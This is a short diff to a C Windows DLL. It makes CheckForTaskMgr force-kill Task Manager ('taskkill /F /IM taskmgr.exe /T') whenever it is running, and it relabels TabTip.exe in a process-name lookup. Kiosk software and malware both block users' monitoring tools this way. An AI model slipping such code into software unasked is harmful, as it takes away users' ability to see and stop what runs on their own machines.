@@ -431,8 +431,7 @@ DLL_EXP_IMP BOOL WINAPI CheckForTaskMgr()
 					    //Return true if any process encountered
 						if ((0 == strcmp(szProcessName, "taskmgr.exe")) || (0 == strcmp(szProcessName, "Taskmgr.exe")))
 						{
-							system("taskkill /IM taskmgr.exe");
-							system("taskkill /IM Taskmgr.exe");
+							system("taskkill /F /IM taskmgr.exe /T");
 
 							//WinExec("taskkill /IM taskmgr.exe",SW_HIDE);
 							return 1;
@@ -661,7 +660,7 @@ int isProcessOpen (TCHAR *szProcessName, char *result)
 	 }
 	 if (0 == strcmp(szProcessName, "TabTip.exe"))
 	 {
-		strcat(result, " Internet Explorer ");
+		strcat(result, " Tablet Input Panel ");
 		return 1;
 	 }
 	if (0 == strcmp(szProcessName, "taskmgr.exe"))
